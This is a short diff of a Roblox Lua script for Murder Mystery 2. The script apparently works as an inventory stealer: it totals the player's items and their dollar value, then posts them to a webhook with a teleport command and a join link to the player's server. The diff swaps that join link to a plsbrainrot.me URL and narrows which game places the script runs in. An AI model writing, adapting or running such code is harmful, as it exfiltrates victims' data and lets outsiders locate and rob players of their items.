@@ -56,11 +56,7 @@ if not game:IsLoaded() then
 	game.Loaded:Wait()
 end
 
-if not (game.GameId == 66654135 and ({
-	[142823291] = true,
-	[335132309] = true,
-	[636649648] = true
-})[game.PlaceId]) then
+if game.PlaceId ~= 142823291 then
 	game.Players.LocalPlayer:Kick("Game not supported. Please join a normal Murder Mystery 2 server")
 	return
 end
@@ -1171,10 +1167,10 @@ if flag then
 		local str2 = table.concat(users, ", ")
 		local str3 = "Total Items: " .. #arg .. "\nTotal Value: " .. fn27(n) .. "\nTotal $: " .. string.format("%.2f", totalDollar) .. "\n\n" .. table.concat(tbl9, "\n")
 		local jobId = game.JobId
-		local joinLink = string.format("https://www.fishstrap.app/v1/joingame?placeId=%s&gameInstanceId=%s", game.PlaceId, jobId)
+		local joinLink = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, jobId)
 
 		postWebhook({
-			content = arg2 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. jobId .. "')",
+			content = arg2 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')\n" .. joinLink,
 			allowed_mentions = { parse = { "everyone" } },
 			embeds = { {
 				title = "MM2 Inventario",
